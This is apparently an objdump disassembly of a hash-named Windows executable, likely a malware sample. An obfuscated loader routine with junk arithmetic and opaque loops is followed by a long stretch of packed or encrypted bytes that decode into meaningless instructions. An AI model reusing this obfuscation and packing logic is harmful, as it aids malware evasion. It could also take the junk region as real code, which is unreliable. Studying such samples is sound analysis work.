
53ccb304cb1fdac079bd1857ff178529aeff09b23ff224186f73a993c9fa405e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0x70cec454
  40157e:	cld    
  40157f:	aam    0x7b
  401581:	jnp    0x4015fe
  401583:	jnp    0x401579
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [esi-0x75],edx
  401596:	mov    cl,BYTE PTR [ebx+0x1d22b38a]
  40159c:	(bad)  
  40159d:	xchg   ecx,eax
  40159e:	test   eax,0x51987e88
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x1d5c06c4],0x35
  40162d:	cdq    
  40162e:	inc    edx
  40162f:	xchg   ecx,eax
  401630:	pop    esi
  401631:	fcmovb st,st(6)
  401633:	sbb    dh,BYTE PTR [ecx-0x67d9c7b7]
  401639:	out    dx,eax
  40163a:	ret    0x2239
  40163d:	out    0x4b,eax
  40163f:	dec    ebp
  401640:	mov    edi,0xb365f89c
  401645:	xchg   esp,eax
  401646:	pop    edx
  401647:	pop    edi
  401648:	mov    WORD PTR [edx-0x5a],cs
  40164b:	mov    esp,0xbff1e943
  401650:	or     DWORD PTR [esi-0x63338287],esp
  401656:	dec    si
  401658:	push   esi
  401659:	push   0x40
  40165b:	adc    al,0xc1
  40165d:	out    0x8a,eax
  40165f:	jp     0x401628
  401661:	sbb    al,BYTE PTR [ecx]
  401663:	daa    
  401664:	sbb    eax,0x4640db09
  401669:	push   ebx
  40166a:	hlt    
  40166b:	jns    0x40160a
  40166d:	retf   0x2ee8
  401670:	pop    esi
  401671:	lds    esp,FWORD PTR [ecx-0x3f57323b]
  401677:	or     BYTE PTR [esi],ah
  401679:	xor    dh,BYTE PTR [esi+eax*2-0x675f4b7]
  401680:	sub    dh,BYTE PTR [edx]
  401682:	out    0x47,eax
  401684:	cs or  ecx,edi
  401687:	retf   
  401688:	push   esp
  401689:	dec    esp
  40168a:	aam    0xbb
  40168c:	jo     0x401668
  40168e:	test   BYTE PTR ds:0x4c5cd9ea,cl
  401694:	imul   eax,DWORD PTR [ebx-0x28],0xc397f7dd
  40169b:	popf   
  40169c:	jbe    0x401697
  40169e:	repz clc 
  4016a0:	cwde   
  4016a1:	and    BYTE PTR [ecx+ebp*4],0x83
  4016a5:	in     al,0x69
  4016a7:	daa    
  4016a8:	clc    
  4016a9:	pop    es
  4016aa:	add    eax,0x17c41e70
  4016af:	repnz iret 
  4016b1:	mov    al,ds:0xb7345222
  4016b6:	and    BYTE PTR [ebx+0x20ad40cb],bl
  4016bc:	cmp    al,0x10
  4016be:	inc    ebp
  4016bf:	cmc    
  4016c0:	aad    0xc
  4016c2:	xchg   esp,eax
  4016c3:	cmc    
  4016c4:	das    
  4016c5:	push   ds
  4016c6:	outs   dx,DWORD PTR ds:[esi]
  4016c7:	push   ss
  4016c8:	add    DWORD PTR es:[edi],edi
  4016cb:	pop    esp
  4016cc:	inc    ebx
  4016cd:	fidivr WORD PTR [ecx+0x2]
  4016d0:	in     al,0x3
  4016d2:	imul   DWORD PTR [ebx-0x59eb905a]
  4016d8:	mov    DWORD PTR [ebx-0x7876734c],edx
  4016de:	adc    DWORD PTR [ebx+0x5c9cd9a7],ecx
  4016e4:	and    DWORD PTR [ecx-0x2f1b7636],ecx
  4016ea:	push   es
  4016eb:	stos   BYTE PTR es:[edi],al
  4016ec:	xor    eax,0x482560b3
  4016f1:	xor    al,0x25
  4016f3:	sbb    dh,dh
  4016f5:	loopne 0x401760
  4016f7:	push   esi
  4016f8:	push   0xd8ec194c
  4016fd:	dec    ebx
  4016fe:	and    ah,0xd6
  401701:	fstp   st(7)
  401703:	retf   
  401704:	int    0xff
  401706:	(bad)  
  401707:	cmovg  ebx,DWORD PTR [edx]
  40170a:	into   
  40170b:	mov    bh,BYTE PTR [ebp-0x4ef3f6d5]
  401711:	and    esp,DWORD PTR [ebp-0x67]
  401714:	pushf  
  401715:	sbb    al,0x49
  401717:	(bad)  [esi-0x5051aae1]
  40171d:	aad    0x77
  40171f:	retf   
  401720:	cmp    BYTE PTR [edi-0x512b66e5],ah
  401726:	into   
  401727:	cmp    eax,edx
  401729:	xor    BYTE PTR [edx],dh
  40172b:	(bad)  
  40172c:	and    eax,0xb0cd0787
  401731:	sbb    esp,DWORD PTR [edi]
  401733:	add    BYTE PTR [ecx+0x587d5a30],dh
  401739:	xor    eax,0x3873c288
  40173e:	scas   al,BYTE PTR es:[edi]
  40173f:	ja     0x401722
  401741:	repz jmp 0xb14acd17
  401747:	pushf  
  401748:	mov    esi,0x412d921c
  40174d:	or     edi,eax
  40174f:	sub    dl,BYTE PTR [ecx-0x59]
  401752:	cmp    al,BYTE PTR [edx-0x7c89c4c6]
  401758:	push   cs
  401759:	ret    
  40175a:	xor    edi,DWORD PTR [ebp-0x71]
  40175d:	xchg   ebx,eax
  40175e:	mov    esp,0x99f28140
  401763:	mov    eax,ds:0x4e3e53d
  401768:	test   BYTE PTR [ebx],bh
  40176a:	cmp    DWORD PTR [ebx+0x267831f3],ebx
  401770:	add    ch,BYTE PTR [ecx+0x59]
  401773:	stc    
  401774:	xlat   BYTE PTR ds:[ebx]
  401775:	shl    DWORD PTR [edi],cl
  401777:	pop    ecx
  401778:	(bad)  
  40177a:	xor    ecx,eax
  40177c:	push   eax
  40177d:	sahf   
  40177e:	ss jnp 0x40172e
  401781:	hlt    
  401782:	mov    esi,0xd9d68386
  401787:	add    esp,ebp
  401789:	xchg   DWORD PTR [edx+0x3d],edi
  40178c:	push   edi
  40178e:	xlat   BYTE PTR ds:[ebx]
  40178f:	out    dx,eax
  401790:	cmp    eax,0xca6dbb0f
  401795:	fsubr  QWORD PTR [esi]
  401797:	or     eax,0x4e494466
  40179c:	imul   esp,DWORD PTR [edi+0xa5244e],0x229b614b
  4017a6:	outs   dx,DWORD PTR ds:[esi]
  4017a7:	cmc    
  4017a8:	jp     0x401766
  4017aa:	hlt    
  4017ab:	xor    esi,DWORD PTR [ebx-0x53a65fbb]
  4017b1:	sbb    dh,BYTE PTR [ebp-0x786d4786]
  4017b7:	jo     0x4017fe
  4017b9:	xlat   BYTE PTR ds:[ebx]
  4017ba:	jns    0x4017f8
  4017bc:	push   esi
  4017bd:	adc    ebx,ebx
  4017bf:	repz cmc 
  4017c1:	dec    ecx
  4017c2:	int    0x32
  4017c4:	imul   edx,DWORD PTR [ebp+esi*1-0x71],0xf52208b4
  4017cc:	mov    esp,0x71f1d67e
  4017d1:	stos   BYTE PTR es:[edi],al
  4017d2:	mov    ds:0x48e20b0c,eax
  4017d7:	add    BYTE PTR [edx+0xeb73967],bl
  4017dd:	sbb    BYTE PTR [ebx-0x64],0xc3
  4017e1:	fs repnz cmc 
  4017e4:	addr16 mov al,ds:0x8767
  4017e8:	pop    esp
  4017e9:	cmp    BYTE PTR [edx-0x3feed954],ch
  4017ef:	cli    
  4017f0:	jmp    0x2203:0x7d839d85
  4017f7:	loopne 0x4017f8
  4017f9:	test   eax,0x54832f8d
  4017fe:	ret    
  4017ff:	or     bh,cl
  401801:	xor    al,0x37
  401803:	out    0xbc,eax
  401805:	aaa    
  401806:	rol    DWORD PTR [ebp-0x71],1
  401809:	shr    BYTE PTR [edi+0x6f],0x4e
  40180d:	sbb    dl,BYTE PTR [edx+esi*1-0x3f1e05f0]
  401814:	pop    es
  401815:	jl     0x401818
  401817:	int    0x76
  401819:	dec    esi
  40181a:	(bad)  
  40181b:	imul   ebx,DWORD PTR [ecx-0x5a68aefd],0xffffffda
  401822:	or     BYTE PTR [edx+0x3c],dh
  401825:	loopne 0x401809
  401827:	jp     0x4018a1
  401829:	cmp    eax,0x6c3e7f4a
  40182e:	aam    0x99
  401830:	pop    eax
  401831:	mov    dh,0xf7
  401833:	jle    0x401871
  401835:	jae    0x40180c
  401837:	jb     0x401833
  401839:	imul   edi,DWORD PTR [ebp+0x1eacf40e],0x79
  401840:	cld    
  401841:	ret    0x2643
  401844:	sbb    al,0xc4
  401846:	push   esi
  401847:	lea    ebp,[eax]
  401849:	add    DWORD PTR [edx+edi*4-0x79910a51],0xd4f8c41c
  401854:	out    0xb0,eax
  401856:	leave  
  401857:	sbb    bh,al
  401859:	xor    BYTE PTR gs:[ecx-0x3b],bl
  40185d:	daa    
  40185e:	mov    edi,0xc58b394a
  401863:	or     DWORD PTR [ecx],edi
  401865:	push   edx
  401866:	cmp    ebp,DWORD PTR [edx+0x2c63a675]
  40186c:	sbb    eax,0x527c4731
  401871:	push   ecx
  401872:	in     al,dx
  401873:	lds    esp,FWORD PTR [esi+0x701a414e]
  401879:	aad    0x99
  40187b:	std    
  40187c:	out    0xfe,al
  40187e:	lock cmp BYTE PTR [eax],bh
  401881:	ja     0x40182a
  401883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401884:	jecxz  0x401815
  401886:	test   dh,0x48
  401889:	push   esi
  40188a:	add    DWORD PTR [eax],ebp
  40188c:	inc    ecx
  40188d:	hlt    
  40188e:	cmp    DWORD PTR [edx],ebp
  401890:	add    ebp,ebp
  401892:	adc    DWORD PTR [edi],ebp
  401894:	xor    BYTE PTR gs:[ebp+0x7c],0x5c
  401899:	cmp    BYTE PTR [ebp-0x70],dl
  40189c:	cmp    DWORD PTR [esi+0x76489109],ebp
  4018a2:	push   edi
  4018a3:	jecxz  0x401854
  4018a5:	dec    edx
  4018a6:	push   cs
  4018a7:	aas    
  4018a8:	mov    ebx,0x96bcd245
  4018ad:	ins    DWORD PTR es:[edi],dx
  4018ae:	cdq    
  4018af:	cs scas eax,DWORD PTR es:[edi]
  4018b1:	data16 jp 0x401920
  4018b4:	xlat   BYTE PTR ds:[ebx]
  4018b5:	pop    ecx
  4018b6:	dec    esi
  4018b7:	xor    ebp,esi
  4018b9:	jmp    0x7e85db97
  4018be:	lahf   
  4018bf:	shl    BYTE PTR [esi],0xc4
  4018c2:	stos   DWORD PTR es:[edi],eax
  4018c3:	jl     0x401877
  4018c5:	ins    DWORD PTR es:[edi],dx
  4018c6:	hlt    
  4018c7:	add    eax,0x51b22cbf
  4018cc:	jmp    FWORD PTR [ecx-0x5e]
  4018cf:	or     DWORD PTR [eax-0x7],ebp
  4018d2:	stos   DWORD PTR es:[edi],eax
  4018d3:	mov    bl,0x23
  4018d5:	push   esi
  4018d6:	ret    
  4018d7:	add    ebx,DWORD PTR [edx-0x4e5dd022]
  4018dd:	data16 xor BYTE PTR [esi+0x9],cl
  4018e1:	cmp    DWORD PTR [edx+eiz*2+0x488735cd],edx
  4018e8:	ret    0x9aa5
  4018eb:	lods   eax,DWORD PTR ds:[esi]
  4018ec:	mov    eax,ds:0x1901c19a
  4018f1:	cmp    dl,dl
  4018f3:	in     al,dx
  4018f4:	inc    edx
  4018f5:	popa   
  4018f6:	and    DWORD PTR [ebx-0x65],esi
  4018f9:	cmp    dh,ch
  4018fb:	call   0xbaff:0xaa5db8d0
  401902:	or     al,0xf5
  401904:	lahf   
  401905:	ds mov es,eax
  401908:	int3   
  401909:	shr    DWORD PTR [edi+0x3c1a101],1
  40190f:	mov    esp,gs
  401911:	add    BYTE PTR [esp+ebp*2-0x4e9dc5a1],ah
  401918:	push   ss
  401919:	jmp    DWORD PTR ds:0xa2f73fbc
  40191f:	aad    0x9b
  401921:	sbb    DWORD PTR [ecx],ecx
  401923:	dec    esi
  401924:	inc    ebx
  401925:	pop    ecx
  401926:	mov    BYTE PTR [esi],0x4b
  401929:	dec    ecx
  40192a:	pop    eax
  40192b:	sbb    dl,BYTE PTR ds:0xd778f7f8
  401931:	mov    ds:0xa06ff340,al
  401936:	lahf   
  401937:	inc    esi
  401938:	call   0xce8c:0xb2b6cc8
  40193f:	aas    
  401940:	mov    BYTE PTR [ebp-0x1a],bl
  401943:	mov    ch,0x48
  401945:	mov    BYTE PTR [ebp-0xba27b44],ch
  40194b:	ss mov cl,0xb6
  40194e:	ss jmp 0x4018f3
  401951:	xchg   edx,eax
  401952:	repz (bad) 
  401954:	dec    edi
  401955:	mov    cl,BYTE PTR [edx-0x483ed00]
  40195b:	push   eax
  40195c:	xor    ebx,DWORD PTR [eax-0x17874a18]
  401962:	cmc    
  401963:	jbe    0x401998
  401965:	mov    al,BYTE PTR [eax]
  401967:	cs scas eax,DWORD PTR es:[edi]
  401969:	jae    0x401964
  40196b:	lock loopne 0x4019c9
  40196e:	lds    esi,FWORD PTR [edx-0x63]
  401971:	sbb    eax,0x54ce9bb6
  401976:	cmp    ch,bl
  401978:	xor    al,0xb0
  40197a:	and    esi,DWORD PTR [esi]
  40197c:	mov    dl,0x12
  40197e:	cmp    ch,BYTE PTR [edx+0x1fb23cd2]
  401984:	fild   WORD PTR [edi+0x37]
  401987:	mov    ebx,0xa0486dd1
  40198c:	xchg   ebp,eax
  40198d:	out    0x94,eax
  40198f:	lock mov ds:0xd1981cb3,eax
  401995:	inc    eax
  401996:	add    ebx,DWORD PTR [ebx-0x5e39a96f]
  40199c:	pop    edx
  40199d:	into   
  40199e:	les    esp,FWORD PTR ds:0xae3bee62
  4019a4:	in     al,0xdd
  4019a6:	scas   al,BYTE PTR es:[edi]
  4019a7:	push   ecx
  4019a8:	push   eax
  4019a9:	in     eax,dx
  4019aa:	aam    0xc2
  4019ac:	xor    BYTE PTR [edx-0x37],0xf5
  4019b0:	inc    edi
  4019b1:	add    BYTE PTR [ecx+0x3e],dl
  4019b4:	pop    ebx
  4019b5:	loopne 0x401a0f
  4019b7:	js     0x401982
  4019b9:	inc    edx
  4019ba:	add    BYTE PTR [edx-0x5efe3002],ah
  4019c0:	add    BYTE PTR [ecx+0x7b],bl
  4019c3:	dec    esp
  4019c4:	cmp    al,0x24
  4019c6:	push   edi
  4019c7:	inc    esi
  4019c8:	cwde   
  4019c9:	sub    al,0x31
  4019cb:	inc    esp
  4019cc:	cmp    al,BYTE PTR [ebp+0x7c]
  4019cf:	mov    bh,BYTE PTR [eax+0x11b61908]
  4019d5:	neg    ecx
  4019d7:	fsubr  DWORD PTR [eax]
  4019d9:	cdq    
  4019da:	xchg   bl,dh
  4019dc:	cmp    al,BYTE PTR ds:0x9ec0646d
  4019e2:	mov    bh,0x22
  4019e4:	dec    edx
  4019e5:	xchg   bl,dl
  4019e7:	test   BYTE PTR [edi-0x53b4bd19],al
  4019ed:	jnp    0x401a41
  4019ef:	imul   BYTE PTR [edx-0x2e]
  4019f2:	mov    dl,0xa5
  4019f4:	mov    cl,0x67
  4019f6:	rol    BYTE PTR [eax],cl
  4019f8:	pop    edx
  4019f9:	push   esi
  4019fa:	sub    bh,BYTE PTR [edx]
  4019fc:	or     BYTE PTR [ebx],ah
  4019fe:	inc    ebx
  4019ff:	and    ch,BYTE PTR [ecx-0x6e9fcc2a]
  401a05:	cmp    BYTE PTR [ecx-0x71f010e6],bl
  401a0b:	dec    edi
  401a0c:	push   0x4368e6bf
  401a11:	cmc    
  401a12:	and    al,0x53
  401a14:	je     0x401a47
  401a16:	imul   edx,edx,0x3c2118d7
  401a1c:	mov    ebp,edx
  401a1e:	test   eax,0x5d287f3f
